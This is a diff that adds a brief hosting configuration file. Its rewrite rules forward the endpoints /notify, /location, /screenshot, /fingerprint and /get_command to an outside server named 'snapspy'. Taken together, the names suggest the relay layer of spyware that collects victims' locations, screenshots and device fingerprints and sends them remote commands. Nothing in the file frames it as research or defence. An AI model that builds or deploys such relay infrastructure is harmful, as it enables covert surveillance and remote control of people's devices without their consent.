@@ -1,0 +1,10 @@
+{
+  "cleanUrls": true,
+  "rewrites": [
+    { "source": "/notify", "destination": "https://snapspy.onrender.com/notify" },
+    { "source": "/location", "destination": "https://snapspy.onrender.com/location" },
+    { "source": "/screenshot", "destination": "https://snapspy.onrender.com/screenshot" },
+    { "source": "/fingerprint", "destination": "https://snapspy.onrender.com/fingerprint" },
+    { "source": "/get_command", "destination": "https://snapspy.onrender.com/get_command" }
+  ]
+}
